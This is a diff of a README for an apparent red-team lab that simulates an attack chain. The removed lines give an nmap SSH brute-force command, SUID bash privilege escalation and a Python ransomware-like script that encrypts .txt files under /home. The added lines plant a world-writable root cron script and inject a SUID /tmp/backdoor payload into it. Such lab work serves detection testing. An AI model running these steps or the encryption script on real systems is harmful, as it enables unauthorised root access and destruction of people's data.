@@ -1,88 +1,90 @@
-# Red-Team-Attack simulation
+---
 
-Brute Force → Privilege Escalation → Ransomware Execution
+# 🚩 Red-Team-Attack Simulation: Persistence & Escalation
 
-This repository demonstrates a **complete attack chain simulation** in a controlled environment.
-The goal is to emulate real-world attacker behavior to test and improve detection, response, and hardening capabilities.
+This repository demonstrates how a simple misconfiguration in a background task can lead to a full system takeover.
 
+> **Simulated Attack Flow:**
 
-> Simulated attack flow:
-
-1. 🔐 **Brute-force attack** on SSH to gain user credentials.
-2. 🧑‍💻 **Access the target system** using stolen credentials.
-3. 🚀 **Privilege escalation** via shell misconfiguration (`/bin/bash -p`).
-4. 💣 **Deploy and execute a ransomware-like script** to encrypt files.
-5. 🔽 **De-escalation** (optional cleanup or simulation end).
+1. 🔐 **Brute-force:** Gain initial SSH access.
+2. 🧑‍💻 **Access:** Login as a low-privilege user.
+3. 🔄 **Persistence:** Identify a world-writable Cron script.
+4. 🚀 **Privilege Escalation:** Use the Cron job to create a Root SUID backdoor.
+5. 🏁 **Full Control:** Access the Root shell.
 
 ---
 
-## 🔧 Environment Setup
+## 🔧 Phase 1: Environment Setup (The Vulnerability)
 
-> Recommended tools & platforms:
-- Target OS: **Ubuntu/Kali Linux VM**
-- Attacker: **Kali Linux**
-- Tools used: `nmap`, `ssh`, `bash`, custom `ransomware.sh` script
+As the "Admin," create a script that root runs automatically, but forget to lock down the permissions.
+
+**1. Create the "Maintenance" script:**
+
+```bash
+sudo nano /usr/local/bin/cleanup.sh
+
+```
+
+**2. Add dummy logic:**
+
+```bash
+#!/bin/bash
+# System cleanup script
+rm -rf /tmp/*.log
+
+```
+
+**3. The Fatal Mistake (Weak Permissions):**
+
+```bash
+sudo chmod 777 /usr/local/bin/cleanup.sh
+
+```
+
+**4. The Automation:**
+Add to root's crontab (`sudo crontab -e`):
+`* * * * * /usr/local/bin/cleanup.sh`
 
 ---
 
-##  Step 1: Brute Force Attack
+## 🛠️ Phase 2: The Attack Chain
 
-Simulate brute-forcing a user account (`victim`) using `nmap`:
-nmap --script ssh-brute --script-args userdb=username.txt,passdb=passwords.txt -p 22 <ip_address>
+### Step 1: External Access
 
-##  Step 2: login as a normal user 
- ssh user@server-ip
+From the attacker machine, find the user credentials:
 
- ##  Step 3: privilege escalation via misconfiguration 
- 
-   As root, copy /bin/bash to /tmp/bash:
-    cp /bin/bash /tmp/bash
-    
-   Make root the owner and set the SUID bit:
-    chown root:root /tmp/bash
-    chmod +s /tmp/bash
-    
-   Now, execute the bash binary as a normal user:
-    /tmp/bash -p
+```bash
+nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt -p 22 <target_ip>
 
-##  Step 4:Deploy and execute a ransomware-like script
+```
 
-ransomware script :                    
-  
-    from cryptography.fernet import Fernet
-    import os
-    
-    # Change to the target directory
-    os.chdir("/home/")
-    
-    # Generate and save a Fernet key (only once, or reuse an existing one)
-    key = Fernet.generate_key()
-    with open("key.key", "wb") as f:
-        f.write(key)
-    
-    # Initialize Fernet with the key
-    fernet = Fernet(key)
-    
-    # Walk through the directory and encrypt all .txt files
-    for root, dirs, files in os.walk(os.getcwd()):
-        for file in files:
-            if file.endswith(".txt"):
-                file_path = os.path.join(root, file)
-                
-                # Read original content
-                with open(file_path, "rb") as f:
-                    data = f.read()
-                
-                # Encrypt the content
-                encrypted = fernet.encrypt(data)
-                
-                # Overwrite the file with encrypted content
-                with open(file_path, "wb") as f:
-                    f.write(encrypted)
+### Step 2: Identification (Enumeration)
 
+Login as the user and look for files you can edit:
 
- 
-    
+```bash
+ls -l /usr/local/bin/cleanup.sh
 
+```
 
+*Attacker sees `-rwxrwxrwx`, meaning they can change a script that Root executes.*
 
+### Step 3: Persistence & Escalation
+
+Inject the payload into the script. This payload creates a secret "backdoor" shell in `/tmp`.
+
+```bash
+echo "cp /bin/bash /tmp/backdoor && chmod +s /tmp/backdoor" >> /usr/local/bin/cleanup.sh
+
+```
+
+*Wait 60 seconds.*
+
+### Step 4: The Result
+
+The Cron job runs the script as Root. Because the SUID bit (`+s`) is now set on the copy, anyone who runs it inherits Root's powers.
+
+```bash
+/tmp/backdoor -p
+
+```
